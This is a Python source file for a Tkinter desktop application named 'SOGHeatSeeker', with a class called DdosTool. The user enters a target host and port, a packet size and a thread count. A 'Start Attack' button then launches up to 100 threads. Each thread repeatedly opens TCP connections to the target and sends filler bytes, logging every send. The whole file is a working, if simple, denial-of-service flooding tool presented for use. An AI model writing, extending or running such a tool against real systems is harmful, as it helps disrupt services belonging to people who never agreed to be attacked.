import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import socket
import threading
import time
import json

class DdosTool:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("SOGHeatSeeker")
        self.root.geometry("800x600")
        self.root.configure(bg="#f0f0f0")
        
        # Configure styles
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Create main frame
        self.main_frame = ttk.Frame(self.root, padding="10")
        self.main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        
        # Target configuration
        target_frame = ttk.LabelFrame(self.main_frame, text="Target Configuration", padding="10")
        target_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        ttk.Label(target_frame, text="Target Host:").grid(row=0, column=0, sticky=tk.W)
        self.target_host = ttk.Entry(target_frame, width=30)
        self.target_host.grid(row=0, column=1, padx=(10, 0), sticky=(tk.W, tk.E))
        self.target_host.insert(0, "192.168.1.1")
        
        ttk.Label(target_frame, text="Port:").grid(row=1, column=0, sticky=tk.W, pady=(10, 0))
        self.target_port = ttk.Entry(target_frame, width=10)
        self.target_port.grid(row=1, column=1, padx=(10, 0), sticky=tk.W, pady=(10, 0))
        self.target_port.insert(0, "80")
        
        # Attack controls
        attack_frame = ttk.LabelFrame(self.main_frame, text="Attack Controls", padding="10")
        attack_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        ttk.Label(attack_frame, text="Packet Size (bytes):").grid(row=0, column=0, sticky=tk.W)
        self.packet_size = ttk.Spinbox(attack_frame, from_=1, to=65535, width=10)
        self.packet_size.grid(row=0, column=1, padx=(10, 0), sticky=tk.W)
        self.packet_size.delete(0, "end")
        self.packet_size.insert(0, "1024")
        
        ttk.Label(attack_frame, text="Threads:").grid(row=0, column=2, padx=(20, 0), sticky=tk.W)
        self.thread_count = ttk.Spinbox(attack_frame, from_=1, to=100, width=5)
        self.thread_count.grid(row=0, column=3, padx=(10, 0), sticky=tk.W)
        self.thread_count.delete(0, "end")
        self.thread_count.insert(0, "10")
        
        # Status and logs
        status_frame = ttk.LabelFrame(self.main_frame, text="Status", padding="10")
        status_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        
        self.status_var = tk.StringVar(value="Ready to start attack")
        status_label = ttk.Label(status_frame, textvariable=self.status_var)
        status_label.grid(row=0, column=0, sticky=tk.W)
        
        self.progress = ttk.Progressbar(status_frame, length=300, mode='indeterminate')
        self.progress.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=(10, 0))
        
        # Packet logs
        log_frame = ttk.LabelFrame(self.main_frame, text="Packet Logs", padding="10")
        log_frame.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        self.log_text = scrolledtext.ScrolledText(log_frame, height=10)
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        self.main_frame.columnconfigure(0, weight=1)
        self.main_frame.rowconfigure(3, weight=1)
        
        # Control buttons
        button_frame = ttk.Frame(self.main_frame)
        button_frame.grid(row=4, column=0, columnspan=2, pady=(10, 0))
        
        self.start_btn = ttk.Button(button_frame, text="Start Attack", command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.stop_btn = ttk.Button(button_frame, text="Stop Attack", command=self.stop_attack)
        self.stop_btn.pack(side=tk.LEFT, padx=(0, 10))
        self.stop_btn.config(state=tk.DISABLED)
        
        self.clear_btn = ttk.Button(button_frame, text="Clear Logs", command=self.clear_logs)
        self.clear_btn.pack(side=tk.LEFT)
        
        # Attack threads
        self.attack_threads = []
        self.attack_running = False
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        
    def log_message(self, message):
        timestamp = time.strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        
    def update_status(self, message):
        self.status_var.set(message)
        
    def start_attack(self):
        if self.attack_running:
            return
            
        self.attack_running = True
        self.update_status("Starting attack...")
        self.progress.start()
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        
        host = self.target_host.get()
        port = int(self.target_port.get())
        packet_size = int(self.packet_size.get())
        thread_count = int(self.thread_count.get())
        
        # Clear previous logs
        self.log_text.delete(1.0, tk.END)
        self.log_message(f"Starting attack against {host}:{port}")
        
        # Create attack threads
        for i in range(thread_count):
            thread = threading.Thread(target=self.send_packets, args=(host, port, packet_size))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
        # Update status after starting threads
        self.log_message(f"Started {thread_count} attack threads")
        
    def stop_attack(self):
        self.attack_running = False
        self.progress.stop()
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.update_status("Attack stopped")
        
        # Wait for threads to finish
        for thread in self.attack_threads:
            thread.join(timeout=1)
            
        self.attack_threads = []
        self.log_message("All attack threads stopped")
        
    def send_packets(self, host, port, packet_size):
        try:
            while self.attack_running:
                try:
                    # Create TCP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    
                    # Generate packet data
                    packet_data = b'A' * packet_size
                    
                    # Send packet
                    sock.send(packet_data)
                    sock.close()
                    
                    # Log success
                    self.log_message(f"Sent packet to {host}:{port}")
                    
                except Exception as e:
                    self.log_message(f"Error sending packet: {str(e)}")
                    time.sleep(0.1)  # Avoid tight loop on errors
                    
        except Exception as e:
            self.log_message(f"Thread error: {str(e)}")
            
    def clear_logs(self):
        self.log_text.delete(1.0, tk.END)
        self.update_status("Logs cleared")
        
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    tool = DdosTool()
    tool.run()
